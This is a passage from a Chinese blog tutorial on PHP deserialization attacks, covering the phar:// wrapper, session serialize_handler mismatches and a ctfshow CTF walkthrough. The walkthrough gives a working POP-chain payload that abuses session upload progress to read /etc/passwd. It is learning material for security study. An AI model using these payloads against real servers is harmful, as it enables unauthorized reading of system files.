destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;phar://flag.phar&#x27;</span>);</span><br><span class="line"><span class="comment">//include &#x27;flag.phar&#x27;;</span></span><br><span class="line"><span class="comment">//这里地址可以精确到/flag.phar/flag.php, 也可以只写到/flag.phar, 因为在index.php里用到了createDefaultStub缺省方法</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292256447.png" alt="image-20230129225621351"></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202301292257459.png" alt="image-20230129225729348"></p><p>那么为什么这个协议就可以反序列化呢, 我们可以看一下php的<a class="link" target="_blank" rel="noopener" href="https://github.com/php/php-src">源码<i class="fas fa-external-link-alt"></i></a>, 具体可以看<a class="link" target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/master/main/streams/streams.c">这里的1874行<i class="fas fa-external-link-alt"></i></a></p><p>能使用<code>phar伪协议</code>的地方,就能自动反序列化<code>metaData</code>里面的数据</p><p>具体哪些函数可以用<code>phar协议</code>这里做一个汇总, 可以说是比较全面的</p><table><thead><tr><th>fileatime</th><th>filectime</th><th>file_exists</th><th>file_get_contents</th><th>file_put_contents</th></tr></thead><tbody><tr><td>file</td><td>filegroup</td><td>fopen</td><td>fileinode</td><td>filemtime</td></tr><tr><td>fileowner</td><td>fileperms</td><td>fstat</td><td>fseek</td><td>is_dir</td></tr><tr><td>is_link</td><td>is_readable</td><td>is_writeable</td><td>is_writable</td><td>include</td></tr><tr><td>include_once</td><td>opendir</td><td>parse_ini_file</td><td>rmdir</td><td>require</td></tr><tr><td>require_once</td><td>readfile</td><td>stat</td><td>unlink</td><td>mkdir</td></tr><tr><td>copy</td><td>scandir</td><td>filesize</td><td>highlight_file</td><td>new DirectoryIterator</td></tr></tbody></table><p>两种情况下phar能够利用</p><ol><li>能够控制上传或者写入phar文件的情况下. 没有恶意类, 但是可以包含. 就会执行phar里面打包的php文件</li><li>有恶意类, 没有包含, 但是有文件操作函数, 可以控制phar协议头. 可以自动反序列化里面的metaData数据, 配合析构方法, 可能造成漏洞</li></ol><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>phar中, 使用setmetaData函数可以保存任意可反序列化的变量以及类实例</li><li>文件操作函数中, 只要能控制协议头, 均可自动反序列化metaData的数据</li><li>文件包含的情况下, 可以直接执行里面的php文件中的php代码</li></ul><h2 id="第四节-session的反序列化"><a href="#第四节-session的反序列化" class="headerlink" title="第四节 session的反序列化"></a>第四节 session的反序列化</h2><h3 id="0x8-PHP中的session机制"><a href="#0x8-PHP中的session机制" class="headerlink" title="0x8 PHP中的session机制"></a>0x8 PHP中的session机制</h3><p>在<code>php.ini</code>有以下几个默认选项</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">session.upload_progress.enabled = On</span><br><span class="line"><span class="comment">//表示upload_progress功能开启, 也意味着当浏览器向服务器上传一个文件时, php将会把此次文件上传的详细信息(如上传时间/上传进度等)存储在session中;</span></span><br><span class="line">session.upload_progress.cleanup = On</span><br><span class="line"><span class="comment">//表示当文件上传结束后, PHP将会立即清空对应的session文件中的内容, 这个选项非常重要;如果开启表示可能需要竞争, 如果不开启就不需要竞争</span></span><br><span class="line">session.upload_progress.prefix = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="comment">//prefix+name将表示为session中的键名</span></span><br><span class="line">session.upload_progress.name = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="comment">//当name出现在表单中, PHP将会报告上传进度, 最大好处是 它的值可控</span></span><br><span class="line">session.upload_progress.freq =  <span class="string">&quot;1%&quot;</span></span><br><span class="line">session.upload_progress.min_freq = <span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure><p>这里我们只需要了解前四个配置选项即可</p><h3 id="0x9-session处理handler引起的安全问题"><a href="#0x9-session处理handler引起的安全问题" class="headerlink" title="0x9 session处理handler引起的安全问题"></a>0x9 session处理handler引起的安全问题</h3><p>这里我们写两段PHP代码来本地实验一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$u</span>-&gt;name=<span class="string">&#x27;charmersix&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="variable">$u</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先我们来看一下本地<code>session.serialize_handler</code>的不同有什么影响, 这里我们再写一个<code>phpinfo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpinfo.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302041919786.png" alt="image-20230204191912630"></p><p>可以看到原始的是<code>php</code>, 这里我们获取一下session试试, 我们可以在本地看到session内容<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302041922727.png" alt="image-20230204192254625"></p><p>然后我们换一个<code>handler</code></p><p>来到配置文件修改一下<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302041932948.png" alt="image-20230204193230833"></p><p>可以发现明显的不同<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302042341858.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ini: session.serialize_handler = php</span><br><span class="line">session: user|O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Charmersix&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">ini:  session.serialize_handler = php_serialize</span><br><span class="line">session: a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Charmersix&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><p>如果我们存储的是<code>php_serialize</code>形式, 然后再用<code>php</code>这种形式去读取, 就会出现一个反序列化的情况.</p><p>比如这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;Charmersix&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>这样就可以把<code>|</code>后面的反序列化<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302050111775.png" alt="20200309232031-83c7666e-6219-1"></p><p>这里我们做一个题目试试, 由于这个题目曾经出现过<code>ctfshow</code>平台的年初挑战, 所以是可以免费出现的, 别的一些<code>ctfshow</code>会员题目由于担心侵权, 所以题目源码就尽量不会出现在我的文章里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;session.serialize_handler&quot;</span>, <span class="string">&quot;php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$happy</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$happy</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Happy</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$happy</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;happy=<span class="string">&quot;Happy_New_Year!!!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;happy-&gt;happy;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;happy-&gt;<span class="variable">$funName</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;happy-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;happy;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_New_</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$daniu</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$robot</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$notrobot</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_New_</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;daniu=<span class="string">&quot;I&#x27;m daniu.&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;robot=<span class="string">&quot;I&#x27;m robot.&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;notrobot=<span class="string">&quot;I&#x27;m not a robot.&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$funName</span>, <span class="variable">$arguments</span></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu.<span class="variable">$funName</span>.<span class="string">&quot;not exists!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;daniu=<span class="variable language_">$this</span>-&gt;robot;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$robot</span>=<span class="variable language_">$this</span>-&gt;robot;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;daniu-&gt;<span class="variable">$robot</span>=<span class="variable language_">$this</span>-&gt;notrobot;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;daniu;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;daniu.<span class="variable">$key</span>.<span class="string">&quot;not exists!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$zodiac</span>;</span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;happy &quot;</span>.<span class="variable language_">$this</span>-&gt;zodiac.<span class="string">&quot; year!&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;zodiac=<span class="string">&quot;Hu&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)#3</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;zodiac));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;zodiac = <span class="string">&#x27;hu&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里由于本人比较菜就参考一下官方的wp</p><p>思路:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.利用happy类的析构方法</span><br><span class="line">2.读取happy属性的happy属性, 会调用happy属性的__get方法</span><br><span class="line">    所以happy属性必须为new的实例</span><br><span class="line">3.__get方法会触发某个对象的__toString方法</span><br><span class="line">4.__toString方法触发Year类的show方法</span><br></pre></td></tr></table></figure><p>这里可以发现pop链:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Happy:<span class="title function_ invoke__">__destruct</span>()=&gt;_New_:<span class="title function_ invoke__">__get</span>()=&gt;_New_:<span class="title function_ invoke__">__toString</span>()=&gt;Year:<span class="title function_ invoke__">__toString</span>()=&gt;Year:<span class="title function_ invoke__">Show</span>()</span><br></pre></td></tr></table></figure><p>然后我们通过post传一下payload, 构造上传表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;url&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>构造<code>exp.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Happy</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$happy</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">_New_</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$daniu</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$robot</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$notrobot</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Year</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$zodiac</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;happy=<span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu=<span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu-&gt;daniu=<span class="keyword">new</span> <span class="title class_">Year</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu-&gt;robot=<span class="string">&quot;zodiac&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;happy-&gt;daniu-&gt;notrobot=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="comment">//$data = $_POST[&#x27;data&#x27;];</span></span><br><span class="line"><span class="comment">//unserialize($data);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$h</span> = <span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;happy = <span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;happy-&gt;daniu = <span class="keyword">new</span> <span class="title function_ invoke__">_New_</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;happy-&gt;daniu-&gt;daniu = <span class="keyword">new</span> <span class="title class_">Year</span>();</span><br><span class="line"><span class="variable">$h</span>-&gt;happy-&gt;daniu-&gt;robot = <span class="string">&quot;zodiac&quot;</span>;</span><br><span class="line"><span class="variable">$h</span>-&gt;happy-&gt;daniu-&gt;notrobot = <span class="string">&#x27;/etc/passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$h</span>));</span><br></pre></td></tr></table></figure><p>生成payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Happy&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;happy&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;_New_&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;daniu&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;_New_&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;daniu&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Year&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;zodiac&quot;</span>;N;&#125;s:<span class="number">5</span>:<span class="string">&quot;robot&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;zodiac&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;notrobot&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;/etc/passwd&quot;</span>;&#125;s:<span class="number">5</span>:<span class="string">&quot;robot&quot;</span>;N;s:<span class="number">8</span>:<span class="string">&quot;notrobot&quot;</span>;N;&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里我们需要在payload前加上<code>|</code>以及用<code>\</code>来转义<code>&quot;</code></p><p>最终payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:<span class="number">5</span>:\<span class="string">&quot;Happy\&quot;:1:&#123;s:5:\&quot;happy\&quot;;O:5:\&quot;_New_\&quot;:3:&#123;s:5:\&quot;daniu\&quot;;O:5:\&quot;_New_\&quot;:3:&#123;s:5:\&quot;daniu\&quot;;O:4:\&quot;Year\&quot;:1:&#123;s:6:\&quot;zodiac\&quot;;N;&#125;s:5:\&quot;robot\&quot;;s:6:\&quot;zodiac\&quot;;s:8:\&quot;notrobot\&quot;;s:11:\&quot;/etc/passwd\&quot;;&#125;s:5:\&quot;robot\&quot;;N;s:8:\&quot;notrobot\&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>发包, 们会发现他这里有一个<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302072206347.png" alt="image-20230207220632124"></p><p>所以我们需要把cookie补上, 成功<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202302072207463.png" alt="image-20230207220718359"></p></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/Web/">#Web</a>&nbsp;</li><li class="tag-item"><a href="/tags/Study/">#Study</a>&nbsp;</li><li class="tag-item"><a href="/tags/unserialize/">#unserialize</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2022/10/30/web_7_ssrf/"><span class="left arrow-icon flex-center"><i class="fas fa-chevron-left"></i> </span><span class="title flex-center"><span class="post-nav-title-item">Web_7_SSRF/JWT/XXE</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2022/09/20/web_4/"><span class="title flex-center"><span class="post-nav-title-item">Web_4_PHP文件上传</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex-center"><i class="fas fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container"><div id="comments-anchor"></div><div class="comment-area-title"><i class="fas fa-comments"></i>&nbsp;Comments</div><div 